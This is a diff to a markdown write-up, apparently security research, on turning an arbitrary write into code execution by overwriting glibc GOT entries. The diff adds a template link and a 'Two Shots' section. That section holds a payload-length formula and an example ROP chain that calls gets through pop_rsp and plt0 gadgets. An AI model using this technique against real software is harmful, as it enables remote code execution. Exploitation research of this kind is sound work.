@@ -13,6 +13,9 @@ If we cover all the GOT slots, our payload can be triggered by more functions. O
 
 # tl;dr
 
+[Template][4]
+
+
 By attacking Glibc GOT, We can transform arbitrary write to RCE. I shrank the origin method from 0x418 bytes to 0x1f0 bytes. Meanwhile, for common IO functions, I constructed shorter payloads (0x50 bytes). Also, I talked about the method to make it shorter by combining one_gadget. 
 
 
@@ -368,9 +371,30 @@ p.interactive()
 
 # Two Shots
 
-TODO
+Idea: ROP to call read
+
+```
+Assume `Pos=x``,
+
+If x>=4
+
+then,
+
+Len(payload) = 0x10+Pos*8
+
+else:
+
+Len(payload) = 0x10+Pos*8+3*8
+```
+
+For example, x=4:
+
+`payload = flat([dest+0x18,pop_rsp,rdi,dest,gets,plt0])`
+
+
 
 
 [1]: https://hackmd.io/@pepsipu/SyqPbk94a
 [2]: /Infra/SinkFinder.py
 [3]: ./Code
+[4]: ./Temp.md
